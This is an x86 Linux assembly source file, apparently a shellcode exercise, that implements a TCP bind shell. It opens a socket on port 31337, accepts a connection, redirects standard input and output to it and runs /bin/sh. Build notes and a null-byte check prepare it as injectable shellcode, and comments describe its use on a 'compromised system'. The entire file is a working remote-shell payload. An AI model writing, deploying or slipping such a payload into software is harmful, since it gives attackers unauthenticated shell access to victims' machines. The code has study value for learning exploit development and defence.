; Build the code:
; ---------------
; $ nasm -felf32 -o tcpbindshell.o tcpbinshell.asm
; $ ld -o tcpbindshell tcpbindshell.o

; Check for nulls:
; ----------------
; $ objdump -D tcpbindshell -M intel

global _start
section .text
_start:
    ; Socket
    ; Function prototype:
    ;     int socket(int domain, int type, int protocol)
    ; Purpose:
    ;    creates an endpoint for communications, returns a
    ;    descriptor that will be used thoughout the code to
    ;    bind/listen/accept communications
    xor eax, eax    ; zero eax register
    xor ebx, ebx    ; zero ebx register
    xor ecx, ecx    ; zero ecx register
    xor edx, edx    ; zero edx register
    mov al, 0x66    ; socketcall()
    mov bl, 0x1     ; socket() call number for socketcall
    push ecx        ; push null
    push byte 0x6   ; push IPPROTO_TCP value
    push byte 0x1   ; push SOCK_STREAM value
    push byte 0x2   ; push AF_INET
    mov ecx, esp    ; ecx contains pointer to socket() args
    int 0x80
    mov esi, eax    ; esi contains socket file descriptor
 
    ; Bind
    ; Function prototype:
    ;     int bind(int sockfd, const struct sockaddr *addr,
    ;        socklen_t addrlen)
    ; Purpose:
    ;    assigns the addess in addr to the socket descriptor,
    ;    basically "giving a name to a socket"
    mov al, 0x66    ; socketcall()
    mov bl, 0x2     ; bind() call number for socketcall
    push edx        ; push null
    push word 0x697a ; push port number 31337
    push word bx    ; push AF_INET
    mov ecx, esp    ; ecx contains pointer to sockaddr struct
    push byte 0x10  ; push socklen_t addrlen
    push ecx        ; push const struct sockaddr *addr
    push esi        ; push socket file descriptor
    mov ecx, esp    ; ecx contains pointer to bind() args
    int 0x80
 
    ; Listen
    ; Function prototype:
    ;     int listen(int sockfd, int backlog)
    ; Purpose:
    ;    Prepares the socket referenced in the descriptor for
    ;    accepting incoming communications
    mov al, 0x66    ; socketcall()
    mov bl, 0x4     ; listen() call number for socketcall
    push byte 0x1   ; push int backlog
    push esi        ; push socket file descriptor
    mov ecx, esp    ; ecx contains pointer to listen() args
    int 0x80
 
    ; Accept
    ; Function prototype:
    ;     int accept(int sockfd, struct sockaddr *addr,
    ;        socklen_t *addrlen)
    ; Purpose:
    ;    accepts a connection on a socket and returns a new
    ;    file descriptor referring to the socket which is used
    ;    to bind stdin, stdout and stderr to the local terminal
    mov al, 0x66    ; socketcall()
    mov bl, 0x5     ; accept() call number for socketcall
    push edx        ; push socklen_t * addrlen
    push edx        ; push struct sockaddr *addr
    push esi        ; push socket file descriptor
    mov ecx, esp    ; ecx contains pointer to accept() args
    int 0x80
 
    ; Dup2
    ; Function prototype:
    ;    int dup2(int oldfd,    int newfd)
    ; Purpose:
    ;    duplicate a file descriptor, copies the old file
    ;    descriptor to a new one allowing them to be used
    ;    interchangably, this allows all shell ops to/from the
    ;    compomised system
    mov ebx, eax    ; ebx contains descriptor of accepted socket
    xor ecx, ecx    ; zero ecx register
    mov cl, 0x3     ; set counter
dupfd:
    dec cl          ; decrement counter
    mov al, 0x3f    ; dup2()
    int 0x80
    jne dupfd       ; loop until 0
 
    ; Execve
    ; Function descriptor:
    ;     int execve(const char *fn, char *const argv[],
    ;        char *const envp[])
    ; Purpose:
    ;    to execute a program on a remote and/or compromised
    ;    system. There is no return from using execve therefore
    ;    an exit syscall is not required
    xor eax, eax    ; zero eax register
    push edx        ; push null
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    mov ebx, esp    ; ebx contains address of //bin/sh
    push edx        ; push null
    push ebx        ; push address of //bin/sh
    mov ecx, esp    ; ecx pointer to //bin/sh
    push edx        ; push null
    mov edx, esp    ; edx contains pointer to null
    mov al, 0xb     ; execve()
    int 0x80

